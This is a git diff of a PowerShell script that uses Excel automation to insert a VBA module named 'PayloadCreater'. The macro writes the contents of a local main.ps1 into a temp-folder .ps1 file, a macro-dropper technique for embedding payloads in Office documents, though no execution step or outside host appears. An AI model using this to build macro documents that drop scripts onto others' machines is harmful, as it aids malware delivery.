@@ -38,24 +38,29 @@ function CreateModule {
     )
     $filePath = Join-Path $pwd $fileName  
     $excel = New-Object -ComObject Excel.Application  
-    [string]$ModuleName = "myModule"
+    [string]$ModuleName = "PayloadCreater"
     [bool]$existModuleName = $false
+    [string[]]$codeList = Get-Content "./main.ps1"
     [string]$Code = ""
-    $codeList = @(
-        "Sub CreatePayload()"
+    $codelistBeforePrint = @(
+        "Static Sub CreatePayload()"
         "Dim s"
         "Dim n"
         "s = Environ(`"TEMP`") + `"\temp.ps1`""
         "n = FreeFile"
         "Open s For Output As #n"
-        "Print #n, `"Write-Host (Get-Location).Path `""
-        "Print #n, `"Write-Host this`""
-        "Print #n, `"`""
-        "Print #n, `"`""
-        "Print #n, `"`""
+    )
+    $codelistAfterPrint = @(
         "Close #n"
         "End Sub"
     )
+
+    for ($i = 0; $i -lt $codeList.Count; $i++) {
+        $codeList[$i] = ("Print #n, `"" + ($codeList[$i] -replace "`"","`"`"") + "`"")
+    }
+
+    $codeList = $codelistBeforePrint + $codeList + $codelistAfterPrint
+
     foreach ($item in $codelist) {
         $Code += $item + "`n"
     }
@@ -72,7 +77,7 @@ function CreateModule {
     if ($existModuleName) {
         $workbook.VBProject.VBComponents.Remove($workbook.VBProject.VBComponents.Item($ModuleName))
     }
-    $VBComponent = $workbook.VBProject.VBComponents.Add([Microsoft.Vbe.Interop.vbext_ComponentType]::vbext_ct_StdModule)
+    $VBComponent = $workbook.VBProject.VBComponents.Add([Microsoft.Vbe.Interop.vbext_ComponentType]::vbext_ct_ClassModule)
     $VBComponent.Name = $ModuleName
     $VBComponent.CodeModule.AddFromString($Code)
     $workbook.Save()
